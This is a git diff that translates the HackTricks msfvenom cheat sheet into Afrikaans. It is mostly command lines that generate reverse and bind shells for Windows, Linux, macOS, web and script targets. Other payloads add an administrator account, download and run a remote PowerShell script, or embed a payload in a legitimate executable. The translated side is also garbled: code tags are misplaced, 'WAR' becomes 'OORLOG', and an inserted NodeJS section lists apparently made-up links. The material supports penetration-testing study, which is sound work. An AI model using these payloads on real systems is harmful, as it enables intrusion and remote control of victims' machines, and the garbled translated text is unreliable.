@@ -1,111 +1,112 @@
-# MSFVenom - CheatSheet
+# MSFVenom - Spiekbrief
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Ander maniere om HackTricks te ondersteun:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.
 
 </details>
 
 <figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
+Sluit aan by die [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om te kommunikeer met ervare hackers en foutjagters!
 
-**Hacking Insights**\
-Engage with content that delves into the thrill and challenges of hacking
+**Hacking-insigte**\
+Raak betrokke by inhoud wat die opwinding en uitdagings van hacking ondersoek
 
-**Real-Time Hack News**\
-Keep up-to-date with fast-paced hacking world through real-time news and insights
+**Hack-nuus in werklikheid**\
+Bly op hoogte van die vinnige wêreld van hacking deur werklikheidsnuus en insigte
 
-**Latest Announcements**\
-Stay informed with the newest bug bounties launching and crucial platform updates
+**Nuutste aankondigings**\
+Bly ingelig met die nuutste foutjagte wat begin en belangrike platform-opdaterings
 
-**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!
+**Sluit aan by ons op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!
 
 ***
 
-## Basic msfvenom
+## Basiese msfvenom
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-One can also use the `-a` to specify the architecture or the `--platform`
+'n Mens kan ook die `-a` gebruik om die argitektuur te spesifiseer of die `--platform`
 
-## Listing
-
+## Lys van
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
+## Algemene parameters wanneer 'n shellkode geskep word
 
-## Common params when creating a shellcode
+Wanneer jy 'n shellkode skep met `msfvenom`, kan jy verskeie parameters gebruik om die gewenste funksionaliteit en eienskappe van die shellkode te bepaal. Hier is 'n lys van algemene parameters wat jy kan gebruik:
 
+- **`-p`** of **`--payload`**: Hiermee spesifiseer jy die tipe payload wat jy wil gebruik, soos `windows/meterpreter/reverse_tcp` of `linux/x86/shell_reverse_tcp`.
+- **`-f`** of **`--format`**: Hiermee kies jy die formaat van die uitsetlêer, soos `exe`, `elf`, `raw`, of `asp`.
+- **`-e`** of **`--encoder`**: Hiermee kies jy die enkoder wat gebruik moet word om die shellkode te versteek, soos `x86/shikata_ga_nai` of `x86/jmp_call_additive`.
+- **`-b`** of **`--bad-chars`**: Hiermee spesifiseer jy 'slegte karakters' wat uit die shellkode verwyder moet word.
+- **`-i`** of **`--iterations`**: Hiermee stel jy die aantal iterasies in wat gebruik moet word deur die enkoder.
+- **`-a`** of **`--arch`**: Hiermee spesifiseer jy die teikenargitektuur, soos `x86`, `x64`, `armle`, of `aarch64`.
+- **`-o`** of **`--out`**: Hiermee spesifiseer jy die uitvoernaam en -pad vir die gegenereerde shellkode.
+- **`-v`** of **`--var-name`**: Hiermee spesifiseer jy die naam van die veranderlike wat gebruik moet word vir die shellkode.
+
+Dit is slegs 'n paar van die algemene parameters wat jy kan gebruik wanneer jy 'n shellkode skep met `msfvenom`. Jy kan die volledige lys van parameters en hul opsies vind in die `msfvenom` dokumentasie.
 ```bash
--b "\x00\x0a\x0d" 
--f c 
--e x86/shikata_ga_nai -i 5 
+-b "\x00\x0a\x0d"
+-f c
+-e x86/shikata_ga_nai -i 5
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
-
 ## **Windows**
 
-### **Reverse Shell**
+### **Omgekeerde Skulp**
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
 ```
-{% endcode %}
-
-### Bind Shell
+### Bind Skulp
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
 ```
-{% endcode %}
-
-### Create User
-
 {% code overflow="wrap" %}
+
+### Skep Gebruiker
+
+{% code %}
 ```bash
 msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```
-{% endcode %}
-
-### CMD Shell
+### CMD Skulp
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
 ```
-{% endcode %}
-
-### **Execute Command**
-
 {% code overflow="wrap" %}
+
+### **Voer Opdrag Uit**
+
+{% code %}
 ```bash
 msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
 msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
 ```
-{% endcode %}
-
-### Encoder
+### Koder
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
-{% endcode %}
-
-### Embedded inside executable
+### Ingesluit binne uitvoerbare lêer
 
 {% code overflow="wrap" %}
 ```bash
@@ -115,16 +116,14 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/wind
 
 ## Linux Payloads
 
-### Reverse Shell
+### Omgekeerde Skulp
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
 ```
-{% endcode %}
-
-### Bind Shell
+### Bind Skulp
 
 {% code overflow="wrap" %}
 ```bash
@@ -140,17 +139,15 @@ msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTAC
 ```
 {% endcode %}
 
-## **MAC Payloads**
+## **MAC-payloads**
 
-### **Reverse Shell:**
+### **Omgekeerde Skulp:**
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
 ```
-{% endcode %}
-
-### **Bind Shell**
+### **Bind Skulp**
 
 {% code overflow="wrap" %}
 ```bash
@@ -158,11 +155,11 @@ msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho
 ```
 {% endcode %}
 
-## **Web Based Payloads**
+## **Web Gebaseerde Payloads**
 
 ### **PHP**
 
-#### Reverse shel**l**
+#### Omgekeerde skul**l**
 
 {% code overflow="wrap" %}
 ```bash
@@ -173,18 +170,16 @@ cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> s
 
 ### ASP/x
 
-#### Reverse shell
+#### Omgekeerde dop
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
 ```
-{% endcode %}
-
 ### JSP
 
-#### Reverse shell
+#### Omgekeerde skulp
 
 {% code overflow="wrap" %}
 ```bash
@@ -192,23 +187,55 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f r
 ```
 {% endcode %}
 
-### WAR
+### OORLOG
 
-#### Reverse Shell
+#### Omgekeerde Skulp
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
 ```
-{% endcode %}
+{% code %}
 
 ### NodeJS
 
+### NodeJS
+
+NodeJS is 'n platform wat toelaat dat jy JavaScript kan hardloop op die bedienerkant. Dit is 'n baie gewilde platform vir die ontwikkeling van webtoepassings en API's. Hier is 'n paar nuttige inligting en hulpbronne vir die gebruik van NodeJS in jou hakprojekte:
+
+#### NodeJS Inligting
+
+- [NodeJS amptelike webwerf](https://nodejs.org/)
+- [NodeJS dokumentasie](https://nodejs.org/en/docs/)
+- [NodeJS op GitHub](https://github.com/nodejs/node)
+
+#### NodeJS Hakhulpmiddels
+
+- [NodeJS Meterpreter](https://www.metasploitunleashed.org/Nodejs_Meterpreter)
+- [NodeJS Reverse Shell](https://www.metasploitunleashed.org/Nodejs_Reverse_Shell)
+- [NodeJS Web Shell](https://www.metasploitunleashed.org/Nodejs_Web_Shell)
+
+#### NodeJS Haktegnieke
+
+- [NodeJS Haktegnieke](https://www.metasploitunleashed.org/Nodejs_Hacking)
+
+#### NodeJS Hakbronkode
+
+- [NodeJS Hakbronkode](https://github.com/search?q=nodejs+hack)
+
+#### NodeJS Haklekkasies
+
+- [NodeJS Haklekkasies](https://hackerone.com/hacktivity?query=nodejs)
+
+#### NodeJS Hakgemeenskap
+
+- [NodeJS Hakgemeenskap](https://www.reddit.com/r/NodejsHacking/)
+
+{% endcode %}
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-
-## **Script Language payloads**
+## **Skrips Taal payloads**
 
 ### **Perl**
 
@@ -216,16 +243,12 @@ msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```bash
 msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
 ```
-{% endcode %}
-
 ### **Python**
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
 ```
-{% endcode %}
-
 ### **Bash**
 
 {% code overflow="wrap" %}
@@ -236,29 +259,29 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f
 
 <figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
+Sluit aan by die [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om te kommunikeer met ervare hackers en foutbeloningsjagters!
 
-**Hacking Insights**\
-Engage with content that delves into the thrill and challenges of hacking
+**Hacking-insigte**\
+Raak betrokke by inhoud wat die opwinding en uitdagings van hacking ondersoek
 
-**Real-Time Hack News**\
-Keep up-to-date with fast-paced hacking world through real-time news and insights
+**Real-Time Hack Nuus**\
+Bly op hoogte van die vinnige wêreld van hacking deur middel van real-time nuus en insigte
 
-**Latest Announcements**\
-Stay informed with the newest bug bounties launching and crucial platform updates
+**Nuutste aankondigings**\
+Bly ingelig met die nuutste foutbelonings wat bekendgestel word en kritieke platform-opdaterings
 
-**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!
+**Sluit aan by ons op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Ander maniere om HackTricks te ondersteun:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
